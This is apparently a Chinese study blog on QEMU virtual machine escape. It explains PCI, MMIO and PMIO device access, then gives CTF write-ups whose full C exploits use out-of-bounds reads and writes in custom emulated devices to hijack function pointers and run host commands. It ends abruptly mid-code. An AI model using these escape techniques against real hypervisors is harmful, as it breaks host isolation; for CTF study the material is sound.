OS的运行又在QEMU当中，所以host不能绕过QEMU直接观察guest OS。但是QEMU提供了一系列的接口可以导出guest OS的运行情况，内存状态和IO状态等 pci与mmio/pmioPCI是Peripheral Component Interconnect(外设部件互连标准)的缩写，它是目前个人电脑中使用最为广泛的接口，几乎所有的主板产品上都带有这种插槽。PCI设备就是指可以插在主板的PCI插槽/接口上的设备。 内存映射I/O （Memory-mapped I/O —— MMIO）端口映射I/O （port-mapped I/O —— PMIO) 关于其理解可阅读： 强烈推荐 其他： 0000:00:03.0 =&gt; 域:总线:设备.功能 目录/sys/devices/pci0000:00/0000:00:03.0下为00:03.0设备相关的文件，可用ls -l /sys/devices/pci0000\:00/0000\:00\:03.0/命令查看。 用户与mmio/pmio交互方式： mmio： 访问mmio_mem即可。 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;unsigned char* mmio_mem;void perr(char str[])&#123; puts(str); exit(1);&#125;void mmio_write(uint32_t addr, uint32_t value)&#123; *((uint32_t*)(mmio_mem + addr)) = value;&#125;uint32_t mmio_read(uint32_t addr)&#123; return *((uint32_t*)(mmio_mem + addr));&#125;int main()&#123; int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC); if (mmio_fd == -1) perr("[:(]mmio_fd open failed..."); mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0); if (mmio_mem == MAP_FAILED) perr("[:(]mmap mmio_mem failed..."); printf("[:)]mmio_mem = %p\n", mmio_mem); return 0;&#125; pmio： 通过IN以及 OUT指令去访问。可以使用IN和OUT去读写相应字节的1、2、4字节数据（outb/inb,outw/inw, outl/inl），函数的头文件为&lt;sys/io.h&gt;，函数的具体用法可以使用man手册查看。 12345678inb() //读一字节,size=1inw() //读两字节,size=2inl() //读四字节,size=4 outb() //写一字节,size=1outw() //写两字节,size=2outl() //写四字节,size=4 //其他参数得具体而定 还需要注意的是要访问相应的端口需要一定的权限，程序应使用root权限运行。对于0x000-0x3ff之间的端口，使用ioperm(from, num, turn_on)即可；对于0x3ff以上的端口，则该调用执行iopl(3)函数去允许访问所有的端口（可使用man ioperm 和man iopl去查看函数）。 escape的本质首先我们明确的是：我们要pwn什么，通过什么来pwn，最终目标是什么。 以qemu模拟器为例，首先，qemu是一个虚拟机模拟器软件，是有开源源码的，可到官网下载： qemu源码 它用代码实现了cpu，内存，I/O等硬件设备的模拟，内部核心架构可如下表示： 12345678910111213def run_a_guest(): vm = create_vm() vm.create_cpu_object() vm.create_device_object() for_each_cpu(cpu): create_thread(cpu_thread, cpu)def cpu_thread(cpu): while true: try: cpu.run(vm) except EIO eio: find_device(eio.io_address).handle_io(); 所以，当我们运行qemu-system-x86_64这个程序时，它内部会完成虚拟机的模拟和操作系统的装载，然后我们会进入宿主机中的Guest module--客户模式，或者说是qemu模拟出的虚拟机里的User module--用户模式，但是这时候在宿主机中，qemu-system-x86_64仍然只是一个进程罢了，我们可以把它当成平时那些小程序一样，只不过其函数较多，调用的库较多，代码比较复杂，但本质还是不变的，那就是 – 我们要pwn掉qemu-system-x86_64这个程序。 那既然目标明确了，我们就可以像平时思考简单的pwn一样来思考如何pwn掉这个大点的程序 — 寻找程序中的漏洞，然后与其不断交互，来调用漏洞函数以达到触发/利用漏洞函数中的漏洞的目的。 先说挖掘漏洞这一步，qemu是一个庞大的程序，让你在一两天之内去找他源码的漏洞肯定是不可能的，一般比赛中出问题的地方都是一个出题人自定义的模拟设备(开了--enable-kvm的话，cpu和内存则由kvm_driver负责，Qemu主要负责模拟I/O和外围设备和处理/响应虚拟机中的I/O请求)，漏洞一般出在用来模拟这个设备I/O的模拟函数里。我们可以用ida搜索相关函数来寻找漏洞。 找到了漏洞，下一步就是，我们要如何与qemu交互来触发，利用漏洞呢？普通的pwn都是写个python脚本来交互，但是qemu不可以这么做，因为漏洞存在于设备I/O模拟函数中，所以我们必须与设备交互才可触发漏洞函数，想与设备交互的话，就必须在Guest module中运行编译好的程序(exp)来与底层虚拟出的设备交互。 所以现在思路就很清晰了，我们首先要找到设备I/O模拟函数里的漏洞，然后写程序与对应的模拟设备交互，在qemu虚拟出的虚拟机里跑来这个程序来调用/触发qemu-system-x86_64程序的漏洞函数(也就是前面存在漏洞的设备模拟函数)，然后就可以像常规pwn那样做劫持got表，hook，函数指针等来劫持qemu-system-x86_64程序执行流的操作，最终达到使qemu-system-x86_64程序调用system(&quot;cat flag&quot;)的目的，这也就是escape成功了。 一个理想状态的虚拟机应该是和宿主机完全隔离的，无论客户怎么操作虚拟机，都不会对宿主机产生影响也是绝对安全的，所谓的逃逸，也就是冲破虚拟机的隔离牢笼，使在客户机里进行一系列操作结果影响到了宿主机，例如：弹出了宿主机下的计算器，看到了宿主机下的文件内容等。 模拟设备的产生过程想新增自定义的模拟设备应在qemu/hw/misc下添加.c文件，可阅读源码：edu.c源码 QEMU Object Module，简称为QOM，是qemu提供的面向对象编程模型，几乎所有的模拟设备：cpu，内存，总线。。都是利用这一模型来实现的，可以像理解C++一样去理解它即可。 其他/proc/self/pagemap的介绍 edu.c源码教程 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091------ include/linux/ioport.h ------/* * IO resources have these defined flags. * * PCI devices expose these flags to userspace in the "resource" sysfs file, * so don't move them. */#define IORESOURCE_BITS 0x000000ff /* Bus-specific bits */#define IORESOURCE_TYPE_BITS 0x00001f00 /* Resource type */#define IORESOURCE_IO 0x00000100 /* PCI/ISA I/O ports */#define IORESOURCE_MEM 0x00000200#define IORESOURCE_REG 0x00000300 /* Register offsets */#define IORESOURCE_IRQ 0x00000400#define IORESOURCE_DMA 0x00000800#define IORESOURCE_BUS 0x00001000#define IORESOURCE_PREFETCH 0x00002000 /* No side effects */#define IORESOURCE_READONLY 0x00004000#define IORESOURCE_CACHEABLE 0x00008000#define IORESOURCE_RANGELENGTH 0x00010000#define IORESOURCE_SHADOWABLE 0x00020000#define IORESOURCE_SIZEALIGN 0x00040000 /* size indicates alignment */#define IORESOURCE_STARTALIGN 0x00080000 /* start field is alignment */#define IORESOURCE_MEM_64 0x00100000#define IORESOURCE_WINDOW 0x00200000 /* forwarded by bridge */#define IORESOURCE_MUXED 0x00400000 /* Resource is software muxed */#define IORESOURCE_EXT_TYPE_BITS 0x01000000 /* Resource extended types */#define IORESOURCE_SYSRAM 0x01000000 /* System RAM (modifier) */#define IORESOURCE_EXCLUSIVE 0x08000000 /* Userland may not map this resource */#define IORESOURCE_DISABLED 0x10000000#define IORESOURCE_UNSET 0x20000000 /* No address assigned yet */#define IORESOURCE_AUTO 0x40000000#define IORESOURCE_BUSY 0x80000000 /* Driver has marked this resource busy *//* I/O resource extended types */#define IORESOURCE_SYSTEM_RAM (IORESOURCE_MEM|IORESOURCE_SYSRAM)/* PnP IRQ specific bits (IORESOURCE_BITS) */#define IORESOURCE_IRQ_HIGHEDGE (1&lt;&lt;0)#define IORESOURCE_IRQ_LOWEDGE (1&lt;&lt;1)#define IORESOURCE_IRQ_HIGHLEVEL (1&lt;&lt;2)#define IORESOURCE_IRQ_LOWLEVEL (1&lt;&lt;3)#define IORESOURCE_IRQ_SHAREABLE (1&lt;&lt;4)#define IORESOURCE_IRQ_OPTIONAL (1&lt;&lt;5)/* PnP DMA specific bits (IORESOURCE_BITS) */#define IORESOURCE_DMA_TYPE_MASK (3&lt;&lt;0)#define IORESOURCE_DMA_8BIT (0&lt;&lt;0)#define IORESOURCE_DMA_8AND16BIT (1&lt;&lt;0)#define IORESOURCE_DMA_16BIT (2&lt;&lt;0)#define IORESOURCE_DMA_MASTER (1&lt;&lt;2)#define IORESOURCE_DMA_BYTE (1&lt;&lt;3)#define IORESOURCE_DMA_WORD (1&lt;&lt;4)#define IORESOURCE_DMA_SPEED_MASK (3&lt;&lt;6)#define IORESOURCE_DMA_COMPATIBLE (0&lt;&lt;6)#define IORESOURCE_DMA_TYPEA (1&lt;&lt;6)#define IORESOURCE_DMA_TYPEB (2&lt;&lt;6)#define IORESOURCE_DMA_TYPEF (3&lt;&lt;6)/* PnP memory I/O specific bits (IORESOURCE_BITS) */#define IORESOURCE_MEM_WRITEABLE (1&lt;&lt;0) /* dup: IORESOURCE_READONLY */#define IORESOURCE_MEM_CACHEABLE (1&lt;&lt;1) /* dup: IORESOURCE_CACHEABLE */#define IORESOURCE_MEM_RANGELENGTH (1&lt;&lt;2) /* dup: IORESOURCE_RANGELENGTH */#define IORESOURCE_MEM_TYPE_MASK (3&lt;&lt;3)#define IORESOURCE_MEM_8BIT (0&lt;&lt;3)#define IORESOURCE_MEM_16BIT (1&lt;&lt;3)#define IORESOURCE_MEM_8AND16BIT (2&lt;&lt;3)#define IORESOURCE_MEM_32BIT (3&lt;&lt;3)#define IORESOURCE_MEM_SHADOWABLE (1&lt;&lt;5) /* dup: IORESOURCE_SHADOWABLE */#define IORESOURCE_MEM_EXPANSIONROM (1&lt;&lt;6)/* PnP I/O specific bits (IORESOURCE_BITS) */#define IORESOURCE_IO_16BIT_ADDR (1&lt;&lt;0)#define IORESOURCE_IO_FIXED (1&lt;&lt;1)#define IORESOURCE_IO_SPARSE (1&lt;&lt;2)/* PCI ROM control bits (IORESOURCE_BITS) */#define IORESOURCE_ROM_ENABLE (1&lt;&lt;0) /* ROM is enabled, same as PCI_ROM_ADDRESS_ENABLE */#define IORESOURCE_ROM_SHADOW (1&lt;&lt;1) /* Use RAM image, not ROM BAR *//* PCI control bits. Shares IORESOURCE_BITS with above PCI ROM. */#define IORESOURCE_PCI_FIXED (1&lt;&lt;4) /* Do not move resource */#define IORESOURCE_PCI_EA_BEI (1&lt;&lt;5) /* BAR Equivalent Indicator */ 1234567891011lspcilspci -t -vlspci -v -m -n -s 00:03.0hexdump /sys/devices/pci0000\:00/0000\:00\:03.0/configls -la /sys/devices/pci0000\:00/0000\:00\:03.0/cat /sys/devices/pci0000\:00/0000\:00\:03.0/resourcecat /sys/devices/pci0000\:00/0000\:00\:03.0/devicecat /sys/devices/pci0000\:00/0000\:00\:03.0/vendorcat /sys/devices/pci0000\:00/0000\:00\:03.0/classsudo cat /proc/ioportssudo cat /proc/iomem 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;assert.h&gt;#include &lt;inttypes.h&gt;#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)#define PFN_PRESENT (1ull &lt;&lt; 63)#define PFN_PFN ((1ull &lt;&lt; 55) - 1)int fd;uint32_t page_offset(uint32_t addr)&#123; return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);&#125;uint64_t gva_to_gfn(void *addr)&#123; uint64_t pme, gfn; size_t offset; offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7; lseek(fd, offset, SEEK_SET); read(fd, &amp;pme, 8); if (!(pme &amp; PFN_PRESENT)) return -1; gfn = pme &amp; PFN_PFN; return gfn;&#125;uint64_t gva_to_gpa(void *addr)&#123; uint64_t gfn = gva_to_gfn(addr); assert(gfn != -1); return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);&#125;int main()&#123; uint8_t *ptr; uint64_t ptr_mem; fd = open("/proc/self/pagemap", O_RDONLY); if (fd &lt; 0) &#123; perror("open"); exit(1); &#125; ptr = malloc(256); strcpy(ptr, "Where am I?"); printf("%s\n", ptr); ptr_mem = gva_to_gpa(ptr); printf("Your physical address is at 0x%"PRIx64"\n", ptr_mem); getchar(); return 0;&#125; 在ida中查看结构体： view =&gt; Open subviews =&gt; Quick view =&gt; Local types搜索相关type，或者直接shift + F1 重要结构体： ObjectClass=&gt;DeviceClass=&gt;PCIDeviceClass TypeInfo结构体中有两个函数edu_class_init和edu_instance_init，edu_class_init负责初始化ObjectClass结构体，edu_instance_init负责初始化具体Object结构体。 12the Object constructor and destructor functions (registered by the respective Objectclass constructors) will now only get called if the corresponding PCI device&apos;s -device option was specified on the QEMU command line (unless, probably, it is a default PCI device for the machine). Object类的构造函数与析构函数（在Objectclass构造函数中注册的）只有在命令中-device指定加载该设备后才会调用（或者它是该系统的默认加载PCI设备）。 打包方式： 12find . | cpio -o --format=newc &gt; ../initramfs.cpiofind . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.img 学习文章： https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#qemu%E6%A6%82%E8%BF%B0 https://kitctf.de/writeups/hitb2017/babyqemu https://ray-cp.github.io/archivers/qemu-pwn-xnuca-2019-vexx 看雪的外文翻译大佬(其他文章也很不错)： https://bbs.pediy.com/thread-217997.htm https://bbs.pediy.com/thread-217999.htm https://bbs.pediy.com/thread-218045.htm qemu与host文件共享： 9p协议在本机调试时传文件可能比较方便，但是需要支持virtio，这个在编译qemu时需要我们自己手动改写配置文件，所以大概率默认是没有的。 https://kernelshow.com/2018/09/30/2018/09/0003-qemu_use_9pnet_virtio_fs_to_share_folder/ https://zhuanlan.zhihu.com/p/93108832 网络设备相关参数，-net，-netdev，-nic解析： https://zhuanlan.zhihu.com/p/41258581 qemu相关： https://blog.csdn.net/sungeshilaoda/category_8871816.html 。。。。 2017BlizzardCTF_Strng用户名:ubuntu 密码:passw0rd 思路因为是第一道题，所以大部分都是参考的别人的wp，感觉自己理解的还不是很透彻，但还是简单记录一下吧。 漏洞点主要在于设备函数对regs[]数组的访问没有设置边界检查，导致很容易就越界读写了，再加上regs[]后面就是三个函数指针。。。简直就是helloworld般的存在。。。cat flag也可，但是gnome-calculator显然更能装逼。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;unsigned char* mmio_mem;uint32_t pmio_base = 0xc050;void perr(char str[])&#123; puts(str); exit(1);&#125;size_t pmio_write(uint32_t addr, uint32_t value)&#123; outl(value,addr);&#125;size_t pmio_read(uint32_t addr)&#123; return (uint64_t)inl(addr);&#125;uint64_t pmio_leak(uint32_t offset)&#123; pmio_write(pmio_base+0,offset); return pmio_read(pmio_base+4);&#125;void pmio_hijick(uint32_t offset, uint32_t value)&#123; pmio_write(pmio_base+0,offset); pmio_write(pmio_base+4,value);&#125;void mmio_write(uint32_t value, uint32_t offset)&#123; *((uint32_t*)(mmio_mem + offset)) = value;&#125;int main()&#123; int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC); if (mmio_fd == -1) perr("[:(]mmio_fd open failed..."); mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0); if (mmio_mem == MAP_FAILED) perr("[:(]mmap mmio_mem failed..."); printf("[:)]mmio_mem = %p\n", mmio_mem); if (iopl(3) != 0) perr("[:(]I/O permission is not enough...");//----------------leak----------------------------------- uint64_t srandom_addr = pmio_leak(0x108); srandom_addr = srandom_addr &lt;&lt; 32; srandom_addr += pmio_leak(0x104); uint64_t libc_base = srandom_addr - (0x7fc5ba2e38d0-0x7fc5ba2a9000); uint64_t system_addr = libc_base + (0x7ffff6531390-0x7ffff64ec000); printf("[:)]libcbase = 0x%llx\n",libc_base); printf("[:)]system_addr = 0x%llx\n",system_addr);//----------------hijick-------------------------------- mmio_write(0x61632d65,0xc); mmio_write(0x6d6f6e67,8); mmio_write(0x6c75636c,0x10); mmio_write(0x726f7461,0x14); pmio_hijick(0x114,system_addr &amp; 0xffffffff); mmio_write("xxrw_is_so_vegetable:(",0xc); //其实不写也可，应该是在进程结束时会自动调用? return 0;&#125; 2017Hitb_babyqemu用户名:root 密码:空 思路模拟实现了一个简单的dma(直接存储器访问)机制，漏洞点存在于访问dma_buf[]数组时下标没有设置限制，导致了越界读写。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;assert.h&gt;#include &lt;inttypes.h&gt;#include &lt;sys/mman.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)#define PFN_PRESENT (1ull &lt;&lt; 63)#define PFN_PFN ((1ull &lt;&lt; 55) - 1)uint64_t user_buf;uint64_t user_buf_phy;unsigned char* mmio_mem;void perr(char str[])&#123; puts(str); exit(1);&#125;uint64_t page_offset(uint64_t addr)&#123; return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);&#125;uint64_t gva_to_gfn(void *addr)&#123; uint64_t pme, gfn; size_t offset; int fd = open("/proc/self/pagemap", O_RDONLY); if (fd &lt; 0) &#123; perror("open pagemap"); exit(1); &#125; offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7; lseek(fd, offset, SEEK_SET); read(fd, &amp;pme, 8); if (!(pme &amp; PFN_PRESENT)) return -1; gfn = pme &amp; PFN_PFN; return gfn;&#125;uint64_t gva_to_gpa(void *addr)&#123; uint64_t gfn = gva_to_gfn(addr); assert(gfn != -1); return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);&#125;void mmio_write(uint32_t offset,uint32_t value)&#123; *(uint32_t*)(mmio_mem+offset) = value;&#125;void set_dst(uint32_t target)&#123; mmio_write(0x88,target);&#125;void set_src(uint32_t target)&#123; mmio_write(0x80,target);&#125;void set_cnt(uint32_t target)&#123; mmio_write(0x90,target);&#125;void set_cmd(uint32_t target)&#123; mmio_write(0x98,target); sleep(1);&#125;void mmio_leak()&#123; set_src(0x1000+0x40000); set_cnt(8); set_dst(user_buf_phy); set_cmd(1|2);&#125;void mmio_hijick(uint32_t offset,uint32_t len)&#123; set_src(user_buf_phy); set_cnt(len); set_dst(0x40000+offset); set_cmd(1|0);&#125;void trigger()&#123; set_src(0x500+0x40000); set_cmd(1|2|4);&#125;int main()&#123; int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR|O_SYNC); if (mmio_fd == -1) perr("[:(]mmio_fd open failed..."); mmio_mem = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,0); if (mmio_mem == MAP_FAILED) perr("[:(]mmap mmio_mem failed..."); printf("[:)]mmio_mem = %p\n", mmio_mem); user_buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); if(user_buf == MAP_FAILED) perror("[:(]mmio mmap error..."); mlock(user_buf, 0x1000);//-------------------------------------------------------------------------- user_buf_phy = gva_to_gpa(user_buf); printf("[:)]user_buf_phy_addr = %p\n",user_buf_phy); mmio_leak(); uint64_t elfbase = *(uint64_t*)user_buf-0x283dd0; printf("[:)]elfbase = %p\n",elfbase); uint64_t system_addr = elfbase + 0x1fdb18; printf("[:)]system_addr = %p\n",system_addr);//-------------------------------------------------------------------------- *(uint64_t*)user_buf = system_addr; mmio_hijick(0x1000,8); //system char cmd[] = "gnome-calculator"; memcpy(user_buf,cmd,strlen(cmd)); mmio_hijick(0x500,strlen(cmd)); //cmd trigger(); return 0;&#125; 2019XNUCA_Vexx用户名:root 密码:goodluck 思路又是一道oob的题，需要2.27的glibc，我这里是用docker跑的，继续锻炼调试的熟练度和应变能力。 打包exp方法为： 123sudo mount ./rootfs.ext2 ./rootfs -t ext2sudo cp myexp ./rootfssudo umount ./rootfs 因为最后是劫持dma_timer.cb函数指针，判断dma_timer.cb第一个参数的方法为先将其改为system@plt，再下断点，等跳到system@plt时看其rdi数值，得知为dma_timer.opaque。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;assert.h&gt;#include &lt;inttypes.h&gt;#include &lt;sys/mman.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;uint64_t mmio_mem;uint64_t cmb_mem;void perr(char buf[])&#123; puts(buf); exit(1);&#125;void pmio_write(uint32_t val,uint32_t addr)&#123; outb(val,addr);&#125;uint64_t cmb_read(uint32_t addr)&#123; return *(uint64_t*)(cmb_mem + addr);&#125;void cmb_write(uint32_t addr,uint64_t val)&#123; *(uint64_t*)(cmb_mem + addr) = val;&#125;void trigger()&#123; *(uint32_t*)(mmio_mem+0x98) = 1;&#125;int main()&#123; int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR|O_SYNC); if (mmio_fd == -1) perr("[:(]mmio_fd open failed..."); mmio_mem = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,0); if (mmio_mem == MAP_FAILED) perr("[:(]mmap mmio_mem failed..."); printf("[:)]mmio_mem = %p\n", mmio_mem); int cmb_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource1",O_RDWR|O_SYNC); if (cmb_fd == -1) perr("[:(]cmb_fd open failed..."); cmb_mem = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,cmb_fd,0); if (cmb_mem == MAP_FAILED) perr("[:(]mmap cmb_mem failed..."); printf("[:)]cmb_mem = %p\n", cmb_mem); if (iopl(3) != 0) perr("[:(]I/O permission is not enough...");//--------------------------------------------------------------------------------- strcpy(cmb_mem,"gnome-calculator\x00"); pmio_write(0x1,0x230); pmio_write(0xf0,0x240); uint64_t dmatimer_addr = cmb_read(0x48); uint64_t elfbase = dmatimer_addr - 0x4DCF10; printf("[:)]elfbase = %p\n",elfbase); uint64_t system_addr = elfbase + 0x2AB860; printf("[:)]system_addr = %p\n",system_addr); uint64_t VexxState_addr = cmb_read(0x50); printf("[:)]VexxState_addr = %p\n",VexxState_addr); uint64_t cmd_addr = VexxState_addr + (0x5555574f3fb0-0x5555574f3420); printf("[:)]cmd_addr = %p\n",cmd_addr);//---------------------------------------------------------------------------------- cmb_write(0x48,system_addr); cmb_write(0x50,cmd_addr); trigger(); return 0;&#125; 2019湖(fu)湘杯线上云安全_Strng2用户名:root 密码:空 思路又是oob。。。继续练习基本功。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#define _GNU_SOURCE#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;unsigned char* mmio_mem;uint32_t pmio_base = 0xc050;void perr(char str[])&#123; puts(str); exit(1);&#125;void pmio_write(uint32_t value,uint32_t addr)&#123; outl(value,addr);&#125;size_t pmio_read(uint32_t addr)&#123; return (uint64_t)inl(addr);&#125;void mmio_write(uint32_t value, uint32_t offset)&#123; *((uint32_t*)(mmio_mem+offset)) = value;&#125;uint64_t mmio_read(uint32_t offset)&#123; return *(uint64_t*)(mmio_mem+offset);&#125;int main()&#123; int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR|O_SYNC); if (mmio_fd == -1) perr("[:(]mmio_fd open failed..."); mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0); if (mmio_mem == MAP_FAILED) perr("[:(]mmap mmio_mem failed..."); printf("[:)]mmio_mem = %p\n", mmio_mem); if (iopl(3)!=0) perr("[:(]I/O permission is not enough..."); pmio_write(0x110,pmio_base+0); uint64_t leak = pmio_read(pmio_base+4); leak -= 0x29AC8E; printf("[:)]elfbase = %p\n",leak); uint64_t system_addr = leak + 0x200d50; printf("[:)]system_addr = %p\n",system_addr); pmio_write(system_addr,pmio_base+4); pmio_write(0x118,pmio_base+0); leak = pmio_read(pmio_base+4)+(0x5948-0x4e40); mmio_write(0x6d6f6e67,0x10); mmio_write(0x61632d65,0x14); mmio_write(0x6c75636c,0x18); mmio_write(0x726f7461,0x1c); pmio_write(leak,pmio_base+4); return 0;&#125; 2019数字经济云安全线下rw_qemu用户名:root 密码:空 思路当时在现场时完全不知道从哪里下手，抓着pc-bios看了半天。。。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#define _GNU_SOURCE#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;unsigned char* mmio_mem;void perr(char str[])&#123; puts(str); exit(1);&#125;void mmio_write(uint32_t value,uint32_t offset)&#123; *(uint32_t*)(mmio_mem+offset) = value;&#125;uint32_t mmio_read(uint32_t addr)&#123; return *((uint32_t*)(mmio_mem + addr));&#125;int main()&#123; int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR|O_SYNC); if (mmio_fd == -1) perr("[:(]mmio_fd open failed..."); mmio_mem = mmap(0,0x1000000,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,0); if (mmio_mem == MAP_FAILED) perr("[:(]mmap mmio_mem failed..."); printf("[:)]mmio_mem = %p\n", mmio_mem); mmio_write(0,0x000000); mmio_write(0,0x010000); mmio_write(0,0x120000); mmio_write(0,0x130000); mmio_write(0,0x240000); mmio_write(0,0x350000); mmio_write(0,0x260000); mmio_write(0,0x370000); mmio_write(0,0x580000); mmio_write(0,0x490000); mmio_write(0,0x5a0000); mmio_write(0,0x4b0000); mmio_write(0x6d6f6e67,0x600000); mmio_write(0x61632d65,0x600004); mmio_write(0x6c75636c,0x600008); mmio_write(0x726f7461,0x60000c); write(1,mmio_mem,0x1);&#125; 2018Seccon_q-escapeexploit.py123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from hashlib import md5import sys, osdef pow(prefix): i = 0 while True: if md5(prefix + "%x"%i).hexdigest().startswith('000000'): log.info('Found : ' + hex(i)) return hex(i)[2:] i += 1if __name__ == '__main__': s = remote('q-escape.pwn.seccon.jp', 1337) prefix = s.recvuntil(': ').split('md5("')[1].split('"')[0] s.sendline(pow(prefix)) s.recvuntil("/ # ") s.sendline("touch b") exploit = open('exp.gz', 'rb').read() exploit_b64 = exploit.encode('base64') for i in range(0, len(exploit_b64), 1000): s.recvuntil("/ # ") command = "echo -ne \"" + exploit_b64[i:i+1000] + "\" &gt;&gt; b" s.sendline(command) s.sendline("") s.sendline("") s.sendlineafter("/ # ", "cat b | base64 -d &gt; a.gz") s.sendlineafter("/ # ", "gzip -d a.gz") s.sendlineafter("/ # ", "chmod +x ./a") s.sendlineafter("/ # ", "./a") s.recvuntil('/ # ./a') re = s.recvuntil('wait for leak...') print re libc = int(re.split('\n')[-3].split(' ')[3], 16) - 0xd7499d log.info('libc base : ' + hex(libc)) s.sendline('&#123;0&#125;'.format(hex(libc))) s.interactive() s.close() 2018RealworldCTF_SCSI2018DefconQuals_EC3思路没开PIE和GOT表保护，存在后门： 漏洞比较明显，是个UAF： 所以可以转化为一道在子线程中的unlink，最大的问题在于清空堆的碎片，我选择用0x400的chunk来清理堆和用来unlink，最终成功概率大概40%左右，没用后门，弹了计算器装个逼。 exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;unsigned char* mmio_mem;void perr(char str[])&#123; puts(str); exit(1);&#125;void mmio_write(uint32_t addr, uint32_t value)&#123; *((uint32_t*)(mmio_mem + addr)) = value;&#125;uint32_t mmio_read(uint32_t addr)&#123; return *((uint32_t*)(mmio_mem + addr));&#125;int main()&#123; setbuf(stdin,0); setbuf(stdout,0); setbuf(stderr,0); int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC); if (mmio_fd == -1) perr("[:(]mmio_fd open failed..."); mmio_mem = mmap(0, 0x1000000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0); if (mmio_mem == MAP_FAILED) perr("[:(]mmap mmio_mem failed..."); printf("[:)]mmio_mem = %p\n", mmio_mem); for(int i = 0;i &lt; 0x500;i++)&#123; mmio_write(0,0x3f0/8); &#125; mmio_write(0x000000,0x3f0/8); mmio_write(0x010000,0x3f0/8); mmio_write(0x020000,0x3f0/8); mmio_write(0x100000,0); char* buf = malloc(0x1000); if(buf == 0)&#123; perr("[:(]malloc error"); &#125; *((uint64_t*)(mmio_mem + 0x200000)) = 0; *((uint64_t*)(mmio_mem + 